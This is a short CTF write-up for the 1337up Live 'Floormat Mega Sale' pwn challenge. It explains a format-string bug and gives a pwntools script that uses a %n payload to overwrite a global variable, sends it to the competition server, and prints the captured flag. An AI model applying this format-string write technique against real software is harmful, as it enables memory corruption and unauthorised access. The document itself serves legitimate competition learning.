You can download challenge file in [here](https://github.com/q11N9/CTF_Writeups/blob/main/CTFpwn/1337up-live-ctf/pwn/Floormat_Mega_Sale/floormat_sale.zip). 

A format-string bug in here:

![image](https://hackmd.io/_uploads/B1iyfzSGyg.png)

**employee_access()** will give us flag if **employee == 0** 

![image](https://hackmd.io/_uploads/SJhMzfBMyl.png)

Address of **employee**:

![image](https://hackmd.io/_uploads/BynXfGBfJl.png)

We can use `%n` to overwrite the value of **employee**
Script: 
```python!
#!/usr/bin/env python3

from pwn import *

exe = ELF("./floormat_sale_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("floormatsale.ctf.intigriti.io", 1339)

    return r


def main():
    r = conn()
    # input()
    employee = 0x40408c
    payload = f'%{0x1}c%14$n'.encode()
    payload = payload.ljust(0x20, b'A')
    payload += p64(employee)
    r.sendline(b'6')
    r.sendline(payload)
    # pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

```
Run on local:
![image](https://hackmd.io/_uploads/H1dUffHf1x.png)
Run on server: 
![image](https://hackmd.io/_uploads/r1_wzfBz1x.png)

Flag: ```INTIGRITI{3v3ry_fl00rm47_mu57_60!!}```
